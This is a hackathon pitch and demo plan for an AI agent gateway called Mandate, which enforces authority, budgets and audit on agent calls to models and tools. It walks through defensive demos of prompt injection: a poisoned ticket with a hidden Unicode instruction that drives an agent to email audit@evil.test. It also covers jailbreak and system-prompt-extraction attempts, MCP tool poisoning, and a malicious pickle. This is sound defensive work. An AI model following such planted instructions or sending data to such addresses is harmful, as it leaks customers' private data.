# 05 · Pitch, demo and submission

> What the jury and the phase-1 mentors will see from us: the story, the ≤ 10-slide PDF, the 7-minute demo, the Q&A crib, the HackTribe texts, and the claims we may and may not make.
>
> **Sources:** `design/VISION-SPEC.md` (canonical: §0-§2, §9, §10.7-§10.8, §12, §13.4, §13.9, §14.2), `docs/00-task-analysis.md`, `docs/02-threats-and-attack-museum.md`, `research/FACT-CHECK.md` (wins over `research/R*.md`), `design/judging/J1`-`J3`. If this file disagrees with the spec, the spec wins.
>
> **Number rule.** A number goes on a slide, into a description or onto the stage only if (a) a report or test in the repo produced it at tag `v1.0-submission`, or (b) it has a cited external source below. Until the build produces it, it is written as `{placeholder}` (legend in §2.2). If a placeholder can't be filled because the feature was cut or its test is red, **delete the claim**. Never estimate.
>
> **Owners:** L (content, submission, narration). F (visuals, screenshots; video with A).

---

## 1. The story

### 1.1 In one paragraph

Banks are wiring AI agents to models, tools and each other, and handing them credentials that open everything. In April 2026 the Fed, the OCC and the FDIC replaced SR 11-7 with SR 26-2, which says outright that generative and agentic AI are not within its scope. Meanwhile the software agents run on often ships with no authentication at all. Detection alone won't close that gap: the OWASP LLM Top 10 2026 cites adaptive attacks beating most published defences more than 90% of the time. So Mandate puts the guarantee somewhere a classifier can't be talked out of it. Every agent→LLM and agent→MCP call crosses one self-hosted gateway on the only network path agents have, and one hot-reloaded policy file decides what each call may see, spend and send. An agent may only send data to destinations that its user's task, the policy or a trusted tool vouched for. Switch off every AI detector and hijack the model with a poisoned ticket: the exfiltration is still denied. Every number we show comes from a test or report in the repo, and a judge can edit the policy and watch that evidence change within seconds. **Agents get mandates, not keys.**

### 1.2 Three messages every judge should remember

| # | Message | The proof they see | Criterion it carries |
|---|---|---|---|
| 1 | **Authority beats detection.** Detectors produce evidence. Authority produces the guarantee. | Detectors off, model hijacked, the email to `audit@evil.test` still denied, and the Run tab shows where that address came from (demo beat 5, slide 3) | Robustness (30%) |
| 2 | **Evidence is computed, not claimed.** Posture, coverage, self-test and latency come from what the gateways actually loaded and from reports in the repo. | A judge edits `policy.yaml`: the header shows the new version on 2/2 replicas, posture drops, the self-test marks **GAP** (deliberate) rather than **FAIL** (regression), and a broken edit is rejected while the last good version stays live (beats 5-6, slides 7-8) | Reporting (20%), Testing (15-20%) |
| 3 | **It ships and survives poking.** One base URL, one MCP URL, one policy file. Two stateless replicas share one exact budget. `make test` runs offline with no model. | A mentor runs `make test` on their own laptop with no Ollama and no HF token and gets a green control × case matrix (slides 8-9) | Practicality (10-15%), Architecture (20%) |

### 1.3 The five words we ask judges to learn (no more)

Phase-1 mentors read the PDF cold, so we keep new vocabulary to a minimum (J3).

| Word | Meaning in one line |
|---|---|
| **Mandate** | The product. Also the idea: bounded, delegated authority instead of a key that opens everything |
| **Run** | One task an authenticated user hands to an agent (`POST /v1/runs`). It carries the user's trusted destinations |
| **Taint** | A run that has read untrusted content. Taint never clears; it tightens what the run may send |
| **GAP vs FAIL** | GAP (amber): you weakened a control on purpose and the self-test says so. FAIL (red): an enabled control broke |
| **AICL** | Our code namespace ("AI control layer"). It shows up in screenshots as `Blocked by AICL (C24…)` and `x-aicl-*` headers |

---

## 2. The deck (≤ 10 slides, submitted as PDF)

### 2.1 Deck rules

1. **The PDF must stand alone.** In phase 1, mentors score the submission, possibly without us in the room (`docs/00` §3). Each slide's headline *is* its message, and each slide has a footer naming the file or command that proves it.
2. **Format:** 16:9, ≤ 10 pages, < 20 MB, fonts embedded, links clickable. `make submission-check` enforces page count, size, links and the tag.
3. **Screenshots** come from the running `rc1` / `v1.0-submission` tag. Seeded history is labelled `synthetic`. **Never** put a screenshot of `mockups/dashboard.html` in the PDF as if it were the product. If a page didn't ship, its screenshot leaves the deck.
4. **Numbers** come only from the placeholders in §2.2. If a placeholder is empty, the claim leaves the slide.
5. **IDs** use the 2026 form (`LLM01:2026`, `ASI01`, `MCP03:2025`, `AML.T0051.001`). Incidents are phrased exactly as in FACT-CHECK D7 (see §6).
6. **Diagrams** are rendered from `diagrams/src/*.mmd` into `diagrams/png/`. Slide diagrams are simplified; the full ones stay in the README.

### 2.2 Placeholder legend (fill at IC5 / PDF v1, H17:30-H18:45)

| Placeholder | Meaning | Source file | Produced by | Used on |
|---|---|---|---|---|
| `{reload_s}`, `{reload_p95_s}` | policy save → enforced on 2/2 replicas (one edit / p95) | header toast; `reports/results.jsonl` | `tests/integration/test_live_edits.py` | slides 2, 8, 9; beat 5 |
| `{n}`, `{sha}` | policy version and short sha | live header | gateways' heartbeats | slides 2, 3, 8; beats 5-6 |
| `{fence_unreachable}/{fence_total}` | forbidden targets unreachable from the agent container | `reports/fence.json` | `fence-probe` in `make test` | slides 2, 8; beat 1 |
| `{inv_blocked}/{inv_total}` | agentic attacks still blocked with C09/C10/C11/C16 off | `make test` output, `reports/results.jsonl` | invariant suite + `policies/test-detectors-off.yaml` | slides 3, 8; beat 5 |
| `{race_admitted}`, `{race_overshoot_pct}` | cross-replica race: 200 fired at a cap worth 50 | `reports/junit.xml`, race tile | `tests/integration/test_budget_race.py` | slides 5, 8; beat 9 |
| `{t0_p95_ms}` `{t1_p95_ms}` `{t2_p95_ms}` `{t3_p95_ms}` | per-stage p95 | `reports/perf.md` | `make bench` (P1 #1) | slide 4 |
| `{p95_overhead_det_ms}`, `{p95_overhead_t2_ms}` | gateway overhead p95, deterministic path / with one classifier window, at c = 1/10/50 | `reports/perf.md` | `make bench` | slide 9; Q&A |
| `{holdback_ttft_ms}` | time to first token added by the stream holdback | `reports/perf.md` | `make bench` | slides 4, 9 |
| `{bench_machine}` | the laptop the bench ran on | `reports/perf.md` header | C / A | slides 4, 9 |
| `{case_total}`, `{case_pass}` | cases in `make test` and how many pass | `reports/junit.xml`, `reports/results.jsonl` | `make test` | slide 8; beat 10 |
| `{make_test_warm_s}`, `{make_test_cold_min}` | `make test` wall time, warm / cold incl. build | README, IC5 log | clean-room run on the hot spare (H17:30) | slide 8 |
| `{feed_serial}`, `{feed_apply_s}`, `{feed_rules}` | live feed serial, publish → enforced, rule count | header; feed suite results | feed tests | slide 6; beat 8 |
| `{posture}`, `{posture_before}`, `{posture_after}` | posture score | Overview screenshot | `control` | slide 7; beat 5 |
| `{llm_green}`, `{asi_green}`, `{mcp_green}` | green cells per framework row | `reports/coverage-matrix.json` | `make test` | slide 7 |
| `{mutation_kill_rate}` | share of disabled controls that some test catches | `make test-mutation` output | P1 #8 (optional) | slide 8 |
| `{eval_tpr}`, `{eval_fpr}`, `{ci}`, `{pl_slice_tpr}` | held-out efficacy with Wilson 95% CIs; Polish slice | `reports/eval/*.json` | `make eval` (P1 #3, optional) | slides 4, 8; Q&A 3 |
| `{team_name}`, `{member_1..6}`, `{repo_url}`, `{video_url}` | submission fields | — | L, at H0 / H11 / H20 | slides 1, 10; §5 |

**If `make bench` didn't ship:** no latency numbers on slides (spec §10.6: "Only these numbers appear on slides"). Show one Playground screenshot with its `Server-Timing` header, labelled "single request", instead.

### 2.3 Slide by slide

---

#### Slide 1 · Mandate — agents get mandates, not keys

- **Message:** banks are handing agents keys that open everything, and the new US model-risk guidance explicitly leaves agentic AI out. That gap is our product.
- **On the slide:**
  - Name, tagline, the one-liner (spec §1.2), `{team_name}`, `{repo_url}`, `{video_url}`.
  - **Quote card:** *"Generative AI and agentic AI models are novel and rapidly evolving, and as such, they are not within the scope of this guidance."* SR 26-2, issued jointly by the Fed, the OCC (Bulletin 2026-13) and the FDIC on 17 Apr 2026; it supersedes SR 11-7. Source: FACT-CHECK C5.
  - **Number card:** "~175,000 Ollama hosts reachable from the internet with no auth, in 130 countries" (SentinelLABS + Censys, Jan 2026; `research/R2-historical-attacks.md` row b4, links in R2 §sources). **[verify]** FACT-CHECK did not re-check this figure. Open the source once before PDF v1; if it can't be confirmed, drop the card and say "exposed AI infrastructure" without a number.
  - **Bottom strip:** the six root causes from `docs/02` §2 as six icons: executable model files · unauthenticated AI admin APIs · the lethal trifecta · leaky output channels · poisoned supply chain · denial of wallet and jailbreaks.
- **Earns:** no criterion directly. It frames Robustness (30%) and tells a phase-1 mentor in ten seconds what we built.
- **Speaker notes (L):** In April the Fed, OCC and FDIC replaced SR 11-7, and the new guidance says in plain words that generative and agentic AI are out of scope. Meanwhile the infrastructure agents run on ships without authentication; SentinelLABS and Censys counted about 175,000 exposed Ollama hosts. Banks are giving their agents keys. We give them mandates.

---

#### Slide 2 · One policy brain on the only path agents have

- **Message:** agents can reach exactly one host. Behind it, two stateless gateways enforce one hot-reloaded policy file, and a separate control plane computes the evidence.
- **On the slide:**
  - `diagrams/src/slide-architecture.mmd` (simplified spec §3.3): agents network (internal, no route out) → `lb` → gateway ×2 (LLM edge + MCP edge + one policy brain) → guard, Valkey, feed; MCP servers in a no-egress sandbox; `control` on its own admin network.
  - **Fence badge:** `{fence_unreachable}/{fence_total} forbidden targets unreachable from inside the agent container` (`reports/fence.json`).
  - **Header-strip screenshot:** `policy v{n} · {sha} · 2/2 replicas · applied {reload_s} s ago`, plus a rejected edit (red, YAML path shown, previous version still active).
  - **Four edges, honestly** (spec §3.6): agent→LLM deep · agent→MCP deep · app→agent = `POST /v1/runs`, the trust anchor · agent→agent thin (P1), ASI07 shown as partial.
  - Footnote: "AICL = code namespace. Block messages read *Blocked by AICL (C24…)*."
- **Earns:** Architecture & performance (20%). Supports Practicality.
- **Speaker notes (L; A takes questions):** The data plane never depends on the control plane: stop `control` and enforcement and audit carry on. The gateway never runs tool code; MCP servers sit in a sandbox with no egress and get a per-backend credential, never the agent's token. Save `policy.yaml` and both replicas apply it in `{reload_p95_s}` s; a typo or a bad regex is rejected and the last good version stays live.

---

#### Slide 3 · Authority beats detection

- **Message:** switch off every AI detector and hijack the model: the exfiltration is still denied, because the destination never came from the user.
- **On the slide:**
  - **Threats-drawer Run tab screenshot** of scenario S4: `web_fetch.1` (ticket 42 with a hidden Unicode-tag instruction, shown decoded) → `crm_get_customer` → `bankdb_query` (`LIMIT 100` added, PESEL/IBAN redacted) → `mail_send_email(to=audit@evil.test)` **DENIED · C24.provenance_untrusted · dest_class: untrusted · source: web_fetch.1**.
  - **Before / after strip:** "detectors on: denied" | "C09, C10, C11, C16 off (policy v{n}): the model follows the hidden instruction, and the email is still denied".
  - **Where authority comes from** (three icons): the user's task (`POST /v1/runs`, user credential only, HMAC-signed run token) · a policy allowlist · a tool labelled `trusted_source`. Caption: "Chat content never mints authority, whatever its role."
  - **Mini sink matrix** (spec §5.6): the `untrusted` and `spoof` rows are *deny* in every profile.
  - **Test line:** `INVARIANT detectors-off: {inv_blocked}/{inv_total} agentic attacks still blocked` (`make test`, `policies/test-detectors-off.yaml`).
  - Diagram source: `diagrams/src/mcp-taint-provenance.mmd`.
- **Earns:** Robustness & quality of guardrails (30%). Testing too: this is a hermetic test and was our H12 gate.
- **Speaker notes (D runs it; L frames it):** OWASP's 2026 list cites adaptive attacks beating most defences over 90% of the time, so we don't bet the bank on a classifier. Detectors produce evidence: scores, redactions, taint. Authority produces the guarantee. A paraphrase like "audit at evil dot test" gains nothing because membership is a set lookup, and a look-alike bank domain is denied with a critical alert. The legitimate reply to the customer whose address came from the CRM goes through, with a flag.

---

#### Slide 4 · Deterministic first, semantic second, every score visible

- **Message:** a cheap-first cascade catches the known in milliseconds, local models add depth, and every verdict shows its rule, score and threshold.
- **On the slide:**
  - **Cascade bar** with measured p95 from `reports/perf.md` on `{bench_machine}`: T0 policy `{t0_p95_ms}` → T1 deterministic `{t1_p95_ms}` → T2 semantic, one window `{t2_p95_ms}` → [T3 guard LLM `{t3_p95_ms}`, only if P1 #2 shipped] → OUT stream holdback `+{holdback_ttft_ms}` to first token.
  - **Playground screenshot:** a prompt with a PESEL, an IBAN, an AWS example key and a number that fails its checksum → `[PL_PESEL] [IBAN] [SECRET:aws_access_key]`, the bad-checksum number untouched, the stage list with ms, the `Server-Timing` header, and the "what you sent vs what the model saw" diff.
  - **Normaliser views row:** raw · stripped · tag_decoded · nfkc · skeleton (homoglyphs) · folded (leetspeak, letter spacing, Polish diacritics) · decoded (base64 / hex / url).
  - **Strictness strip** (spec §6.3): permissive / **balanced** / strict. Example rows: injection adherence 85% / 95% / 99% → `block_at`; PII mask / redact / block; unknown destination allow+flag / ask / deny. Caption: "adherence = target recall on a held-out calibration set". If `make eval` didn't ship, add "calibration provisional".
  - **Efficacy box (only if `make eval`, P1 #3, shipped):** self-graded vs held-out: TPR `{eval_tpr}` [`{ci}`], FPR `{eval_fpr}`, and the regex-baseline row. Otherwise the box reads "self-graded only; held-out numbers not measured".
- **Earns:** Robustness (30%). Architecture & performance (20%).
- **Speaker notes (B, then C):** The deterministic tier is checksum PII (PESEL, IBAN mod-97, Luhn, NIP), secrets, signed signatures and tool-argument validators, all on RE2, so a ReDoS pattern is rejected at load. The semantic tier is a local injection classifier over sliding windows, so padding can't hide a payload, plus multilingual similarity over English and Polish examples. When a semantic detector fails, the run is tainted; nothing fails open silently. In our own research run a regex baseline caught 0% of InjecAgent's indirect injections (R8), and that is why taint, not detection, carries that case.

---

#### Slide 5 · Hard budgets in tokens, money and local GPU-seconds

- **Message:** we reserve before each call and settle after it, so a cap holds across replicas, and local models are metered like paid ones.
- **On the slide:**
  - **Scope ribbon:** org (monthly) → pool = directory group → seat (user) → agent → run. Caption: "admitted only if every scope has room".
  - **Three units:** tokens · integer micro-USD (`sim/*` models: *simulated commercial pricing*) · local compute-ms (wall clock at P0).
  - **Race tile screenshot:** `200 fired · {race_admitted} admitted · {race_overshoot_pct}% overshoot · 2 replicas` (cap worth 50; the test asserts exactly 50 admitted, i.e. 0% overshoot, and fails otherwise, so the tile goes on the slide only if the test is green on the tag). Comparison line: "a naive check-then-charge design overshot by 400% in our simulation (R8)".
  - **Overview spend panel:** burn-down with 75/95/100% lines; local compute-s vs simulated external µUSD; the "RUNAWAY LOOP STOPPED (C05)" row.
  - **The 429 the agent gets** (spec §7.6): `billing_error · budget_exceeded · scope seat:ola · resets 00:00 UTC` with `x-should-retry: false`.
- **Earns:** Robustness (30%: LLM06:2026 Unbounded Consumption, AML.T0034 Cost Harvesting). Architecture & performance (20%). Practicality (the team's "directory groups → budgets" idea).
- **Speaker notes (C):** One Valkey Lua call reserves across every scope, all or nothing; over the cap the agent gets a 429 and the upstream is never called. Settlement runs even when the client aborts mid-stream. Parameter smuggling is closed: `n`, `max_tokens` and Ollama `options` are clamped or stripped, and the fourth identical tool call trips the loop breaker. The error contract copies the Claude apps gateway's, so existing clients already handle it.

---

#### Slide 6 · The Attack Museum: real attacks, replayed, blocked by a signed feed

- **Message:** ten real incidents are each a rule in an externally signed feed and a test in our suite, and a judge can publish a new rule live.
- **On the slide:**
  - **Ten-card grid** (spec §8.5), each card showing the incident, its ID, our verdict, the control and the rule:

    | # | Incident (phrasing per FACT-CHECK D7) | Verdict | Control · rule |
    |---|---|---|---|
    | E1 | Malicious pickle models on Hugging Face + nullifAI broken pickles (2025-02) | blocked; truncated file fails closed | C18 · SIG-0004 |
    | E2 | Exposed AI-infra admin APIs: ShadowRay CVE-2023-48022 (disputed, unpatched by design), Langflow CVE-2025-3248 (CISA KEV), Probllama CVE-2024-37032 | denied | C20 · SIG-0005/6/7 |
    | E3 | MCP tool poisoning (Invariant Labs, 2025-04) | quarantined at `tools/list` | C15 · SIG-0003 |
    | E4 | postmark-mcp rug pull: silent BCC from v1.0.16 (2025-09) | quarantined + diff | C15 · SIG-0013 |
    | E5 | GitHub MCP toxic flow (2025-05) | denied (provenance + trifecta) | C24 |
    | E6 | EchoLeak CVE-2025-32711, markdown-image exfiltration | link stripped mid-stream | C12 · SIG-0002 |
    | E7 | ASCII smuggling with invisible Unicode tags | decoded, shown, blocked | C08, C09 · SIG-0001 |
    | E8 | Nx "s1ngularity": malware drove AI CLIs to hunt secrets (per Wiz / JFrog / OX research) | blocked | C09, C17 · SIG-0012 |
    | E9 | LLMjacking / denial of wallet | 400 / clamp / 429 / circuit open | C03-C05 · SIG-0014 |
    | E10 | Jailbreak families (DAN, Policy Puppetry, Skeleton Key) + Polish variants | blocked or flagged + taint, score shown | C09-C11 · SIG-0009/0010/0016 |

  - **Feed strip** (`diagrams/src/feed-update.mmd`): feed service (its own container, holds the Ed25519 private key) → explicit `make feed-publish` → each gateway checks the pinned key, a serial persisted against rollback, expiry and every rule's embedded test vectors → header `feed #{feed_serial} ✓`, enforced in `{feed_apply_s}` s.
  - **Two callouts:** "one byte tampered → rejected, previous rules stay" · "old serial replayed after a gateway restart → rejected".
- **Earns:** Robustness (30%), specifically the brief's "historical attack mitigation, signatures fed from an externally managed system".
- **Speaker notes (B):** Every payload is benign; detectors fire on structure. Pickles are walked opcode by opcode against an allowlist and never loaded, and anything unparseable is blocked, because scanner denylists keep getting bypassed. AI-infra admin APIs compile into hard exclusions that no policy grant can authorise. And because an AI gateway was itself backdoored on PyPI in March 2026 (LiteLLM 1.82.7 and 1.82.8), our own dependencies are hash-locked.

---

#### Slide 7 · Evidence for the CISO and the CFO

- **Message:** every decision is one tamper-evident audit event tagged with OWASP and ATLAS IDs, and posture is computed from what the gateways actually loaded.
- **On the slide:**
  - **Overview screenshot:** posture `{posture}` with its four sub-scores (coverage, enforcement, verification, health) and the critical-gate banner; the coverage grid (OWASP LLM 2026 ×10 · Agentic ASI ×10 · MCP:2025 ×10 · ATLAS tactic strip) showing `{llm_green}/10`, `{asi_green}/10`, `{mcp_green}/10` (`reports/coverage-matrix.json`); the KPI band.
  - **Threats-drawer Trace tab:** per-control rows with tier, verdict, score vs threshold, rule ID + version + origin, matched view, ms.
  - **Integrity strip:** per-replica hash chain → `control` signs each chain head (Ed25519 key held only by `control`) → `witness` volume. "Edit one line → Verify names the broken seq. Recompute the whole chain → checkpoint mismatch."
  - **Exports:** JSONL · CSV [· OCSF-shaped 1.9.0, only if P1 #4 shipped].
  - Footer: "Supports evidence for EU AI Act Art. 12 logging (Annex III high-risk obligations from 2 Dec 2027, Reg. (EU) 2026/1744)."
- **Earns:** Security reporting (20%).
- **Speaker notes (B; F drives):** Two audiences: management gets posture, spend and KPIs; security gets the live threat table, the decision trace and exports. Each replica writes its own chain and only the control plane holds the signing key, so a gateway can't quietly rewrite history. We say tamper-evident, not tamper-proof. The moment a critical control is switched off, posture is capped at 70 and the panel says why.

---

#### Slide 8 · It tests itself, including after you change it

- **Message:** one offline command runs allowed and blocked cases for every control, and the built-in self-test re-runs after every policy change and tells a deliberate GAP from a regression.
- **On the slide:**
  - **`make test` terminal screenshot** (rich matrix): `{case_total}` cases, `{case_pass}` passing, POS/NEG per control, obfuscation columns; the three headline lines `INVARIANT detectors-off {inv_blocked}/{inv_total}` · `FENCE {fence_unreachable}/{fence_total}` · `RACE 200 fired, {race_admitted} admitted, {race_overshoot_pct}% overshoot`; wall time `{make_test_warm_s}` s warm and `{make_test_cold_min}` min cold.
  - **Controls & Self-test page screenshot** taken after a judge-style edit: PASS · PASS(changed) · **GAP** (amber) · FAIL (red), and the line "S4 EXPOSED since v{n}".
  - **Suite list:** per-control POS + NEG · feed vectors · obfuscation matrix (base64, zero-width, Unicode tags, homoglyph, leetspeak, letter spacing, pre-translated Polish) · detectors-off invariants · fence & admin isolation · hot reload & tamper · feed rollback · budgets incl. the race · Exploit Museum · MCP scenarios S1-S8 · audit completeness & tamper · the demo storyline itself.
  - **Optional, only if shipped:** mutation kill rate `{mutation_kill_rate}` (P1 #8); held-out efficacy table (P1 #3).
- **Earns:** Completeness of the self-testing suite (15-20%).
- **Speaker notes (L):** It needs Docker and nothing else: no Ollama, no HF token, no internet after the image pull; a mock LLM and a stub guard keep it deterministic, and there is a raw `docker compose` command for mentors without `make`. Every case is tagged with control and framework IDs, and meta-tests fail the build if an enabled control lacks one positive and two negative cases, or if blocked content ever reached the upstream. The live self-test goes through the real data plane, and it says GAP, not FAIL, when you weakened something on purpose.

---

#### Slide 9 · Adopt with one URL, scale with stateless replicas

- **Message:** integration is one base URL and one MCP URL; the design maps cleanly to Kubernetes, uses permissive licences and runs fully offline.
- **On the slide:**
  - **Code card:** `OpenAI(base_url="http://<gateway>/v1", api_key="vk_…")` and the MCP URL `http://<gateway>/mcp/{server}`. Next to it, an excerpt of `examples/agent-config/claude-code/managed-settings.json` (`ANTHROPIC_BASE_URL`, `apiKeyHelper`, `allowedProviders: ["customEndpoint"]`, which needs Claude Code ≥ 2.1.285 per FACT-CHECK B3), labelled "recorded clip" and shown only if P1 #10 (Anthropic dialect) shipped.
  - **Performance table** from `reports/perf.md`: overhead p50/p95 at c = 1/10/50 for the deterministic path (`{p95_overhead_det_ms}`) and with one classifier window (`{p95_overhead_t2_ms}`); holdback TTFT `{holdback_ttft_ms}`; policy edit → enforced on 2/2 `{reload_p95_s}`; feed publish → enforced `{feed_apply_s}`; machine `{bench_machine}`.
  - **Today → tomorrow strip:** compose today runs 2 stateless gateway replicas behind Caddy, with all shared state (budgets, runs, taint, pins, policy versions) in Valkey.
  - **K8s mapping** (spec §3.8, five rows): agents network → default-deny NetworkPolicy (+ Cilium `toFQDNs`) · gateways → Deployment + HPA + PDB · Valkey → managed or Sentinel · policy → ConfigMap *directory* mount (about 1 min to propagate; production uses signed bundles) · audit → per-pod chain → OTel → Kafka → SIEM, checkpoints to WORM storage. Add "kustomize + kubeconform in CI" only if P1 #16 shipped.
  - **Licence line:** core is Apache-2.0 / MIT / BSD (Valkey BSD-3, not Redis 8); optional Llama-licensed guard models ship with a "Built with Llama" notice; full table in `docs/LICENSES.md`; `make licenses` fails on GPL/AGPL/SSPL.
  - **"Your first idea survived" row:** directory groups → models and budgets (JWT `groups` claim) · forced chokepoint (network fence) · "my limits" (`GET /v1/me`).
- **Earns:** Practical implementability & scalability (10-15%). Architecture & performance (20%).
- **Speaker notes (A):** Nothing changes in the agent except a URL and a key. Groups come from the IdP's JWT claim, so Entra or AD groups map to models and budgets without code. The gateway is stateless and all shared state lives in Valkey, so scaling means adding replicas, and we prove two replicas share one budget exactly. Envoy or Apigee shops don't replace anything: they call the same brain through `/v1/decide` (P1). All of this runs on one laptop with Wi-Fi off.

---

#### Slide 10 · What Mandate does not stop, and who built it

- **Message:** these are our limits and the partial mitigation for each. A security team should trust a control layer that states them.
- **On the slide:**
  - **Six residual risks** (spec §14.2; full list in `docs/RESIDUAL-RISKS.md`):

    | # | Not stopped | Partial mitigation |
    |---|---|---|
    | T1 | Harmful-but-allowed actions (wrong advice, subtly wrong query) | `ask` on high-risk tools; guard-LLM lane (P1) |
    | T2 | Low-bandwidth exfiltration inside an allowed channel | DLP on sink bodies and URL args, entropy flag, tainted + private read → ask |
    | T3 | Confused deputy through a CRM record the attacker controls | tainted + private read → ask; strict profile: derived → ask |
    | T5 | Unmanaged agents on a host (fence covers containerised agents) | production: network fence + model servers on separate hosts |
    | T6 | Adaptive attacks on classifiers | detectors are evidence only; the guarantees don't depend on them |
    | T16 | agent→agent is thin, no signed A2A (ASI07 partial) | run-token taint inheritance (P1) |

  - **Team row:** `{member_1..6}` with lanes: lead / integrator · gateway & streaming · detection, feed & audit · models, budgets & semantic · agents, MCP & taint · console.
  - **Links:** `{repo_url}` (tag `v1.0-submission`) · `{video_url}` · `JUDGES.md` (copy-paste pokes with expected outcomes, EN/PL) · first command: `make test`.
  - Closing line: **Agents get mandates, not keys.**
- **Earns:** Robustness (an honest threat model, which security judges reward) and Practicality (what a bank still has to add).
- **Speaker notes (L):** We govern actions, not truthfulness, and a covert channel inside a permitted flow can't be decided at a gateway. Everything else on this list has a partial control and a test. If you find a bypass today, it becomes a test case tonight. The repo runs with one command.

---

### 2.4 Criterion × slide check

| Criterion | Weight | Primary slides | Also supported by |
|---|---|---|---|
| Robustness & quality of guardrails | 30% | 3, 4, 6 | 5, 10 |
| Architecture & performance efficiency | 20% | 2, 4, 9 | 5 |
| Security reporting | 20% | 7 | 2 (header), 3 (Run tab) |
| Completeness of the self-testing suite | 15-20% | 8 | 3 (invariant), 5 (race), 6 (museum = tests) |
| Practical implementability & scalability | 10-15% | 9 | 1, 2, 10 |

The two PDFs disagree on the last two weights (15/15 vs 20/10, `docs/00` §3). The deck is balanced so that either reading works.

**Backup slides for Q&A only (not in the PDF):** vendor comparison (spec §2.4) · fail-mode table (spec §5.4) · "what survived of the Squid plan" (spec §2.3) · control catalog with framework IDs (spec §4) · `policy.yaml` excerpt with profiles (spec §6.2-6.3) · full residual register (spec §14.2).

---

## 3. The live demo (7 minutes; ★ = the 3-minute cut)

Condensed from spec §12. Every beat is a step in `tests/e2e/test_demo_storyline.py`. **A beat that is red 10 minutes before stage leaves the pitch.**

### 3.1 Who does what

| Person | On stage | Answers in Q&A |
|---|---|---|
| **L** | narrator, slides, timekeeper; decides 7-min vs 3-min at the start | positioning, "what doesn't it stop", compliance wording |
| **D** | left screen: terminal (`demo-agent`, curl); edits `policy.yaml` if no judge volunteers | taint, provenance, MCP |
| **F** | right screen: console (Playground, Threats drawer, Overview, Self-test) | UI questions |
| **B** | beat 8 live (artifact scan, feed publish, tamper); narrates Verify in beat 10 | guardrails, feed, audit |
| **A** | off-screen at the hot-spare laptop on the same tag, watching the header; switches to `make demo-offline` if needed | architecture, performance |
| **C** | off-screen: guard and Ollama health, `make warm` | budgets, models |

### 3.2 Ten minutes before stage

1. Demo laptop and hot spare both on tag `v1.0-submission`.
2. `make reset-demo && make warm`, then `pytest tests/e2e/test_demo_storyline.py`. Any red beat is struck from the run sheet and L skips it.
3. Console logged in (admin token), zoom 125%; terminal font ≥ 20 pt; notifications off.
4. Editor open on `policy/policy.yaml` at the `controls:` block; `feed/rules/90-judge.yaml` with SIG-9001 ready; fixtures (`evil.pt`, truncated pickle, safetensors twin) in place.
5. Browser tabs: slides, console, the backup video, `make test` terminal recording.
6. Decide the model badge: if the venue network or Ollama looks shaky, start in `make demo-offline` (header shows `LLM: mock`). Every agentic beat uses the scripted agent by default anyway.

### 3.3 Run sheet

| # | ★ | 7-min | 3-min | Who | Action | What the audience sees | If it breaks |
|---|---|---|---|---|---|---|---|
| 0 | ★ | 0:00-0:30 | 0:00-0:20 | L | Hook slide, then architecture slide | SR 26-2 quote, exposed-Ollama card, "We give them mandates." | slides only |
| 1 | ★ | 0:30-1:10 | 0:20-0:45 | D (as intern **ola**, curl) | `sim/gpt-4.1` → `400 model_not_allowed` "granted to quant-analysts"; `GET /v1/me` (3-min: skip); next request → `429 billing_error`, `x-should-retry: false`, reset time; flash the fence result | your first idea, delivered and fenced: `{fence_unreachable}/{fence_total}` unreachable | pre-recorded curl output |
| 2 | ★ | 1:10-1:40 | 0:45-1:05 | F (Playground as **judge**) | prompt with PESEL, IBAN, AWS example key and a bad-checksum number | `[PL_PESEL] [IBAN] [SECRET:aws_access_key]`; bad checksum untouched; stage list; `Server-Timing` | switch model to `mock/scripted` |
| 3 | | 1:40-2:20 | — | F; B narrates | (a) Polish jailbreak in base64 + zero-width; (b) Unicode-tag hidden instruction; (c) benign Polish banking question; (d) Polish system-prompt extraction | (a) blocked, drawer shows decoded + folded views and the rule; (b) Evidence tab reveals the hidden sentence; (c) passes; (d) canary blocks the leak, language-agnostic | stub-guard scores; canary via `response_override` |
| 4 | ★ | 2:20-3:00 | 1:05-1:40 | **alice** mints a run (D); `support-bot` scripted; F opens the Run tab | task "Summarise ticket 42 and reply to the customer": `web_fetch` → `crm_get_customer` → `bankdb_query` → `mail_send_email(to=audit@evil.test)` | hidden instruction redacted, run tainted; `LIMIT 100` added, PII redacted; mail **DENIED** `C24.provenance_untrusted`; Run tab: address came from `web_fetch.1`. Twin run: reply to `jan.nowak@client.example` (from CRM) allowed with a flag (3-min: skip twin) | recorded clip |
| 5 | ★ | 3:00-3:50 | 1:40-2:25 | a **judge** (or D) edits `policy.yaml`; F on the header | set C09, C10, C11, C16 `enabled: false`, save; re-run S4 | header `v{n} · 2/2 replicas · applied {reload_s} s`; posture `{posture_before}` → `{posture_after}`; LLM01/ASI01 amber; self-test GAP. The model now **follows** the hidden instruction, and the email is **still denied**. L: "Detectors are evidence. Authority is the guarantee." | the `make test` invariant line `detectors-off {inv_blocked}/{inv_total}` |
| 6 | | 3:50-4:20 | — | judge / D | set `C24_taint.untrusted_destination: monitor`; revert; then a typo key `enabeld:`, a lookahead regex `pass(?=word)`, and `(a+)+$` | `control_weakened` (critical), posture capped at 70, "S4 EXPOSED since v{n}"; revert → green; typo and lookahead **rejected**, last good version kept, red header with the YAML path; `(a+)+$` accepted and harmless (RE2 linear time, "ReDoS can't happen here") | these edits are integration tests: show the junit rows |
| 7 | | 4:20-4:50 | — | D | `tools/list` with poisoned `facts` → `make demo-rugpull` → agent calls `vault_admin_get_credentials` | `facts_get_fact` quarantined; after the rug pull a diff in the drawer's MCP tab; honeypot → run killed, agent quarantined, 403 on every edge | scripted agent |
| 8 | | 4:50-5:30 | — | B | `aicl scan evil.pt`, truncated pickle, safetensors twin; `web_fetch` to `ray:8265/api/jobs/`; add SIG-9001 + `make feed-publish`; hand-edit one byte of the bundle | pickle blocked (`posix.system` GLOBAL), truncated fails closed, safetensors allowed; Ray call denied; header `feed #{feed_serial} ✓` and the new rule blocks the next request; tampered bundle rejected, red feed cell | pre-generated fixtures |
| 9 | | 5:30-6:00 | — | D + F (spend panel) | flaky-tool loop; a request with `n=50` / `max_tokens: -1` | 4th identical call → circuit open; "RUNAWAY LOOP STOPPED"; burn-down; race tile `200 → {race_admitted}, {race_overshoot_pct}%`; `400 invalid_max_tokens` | race-test screenshot |
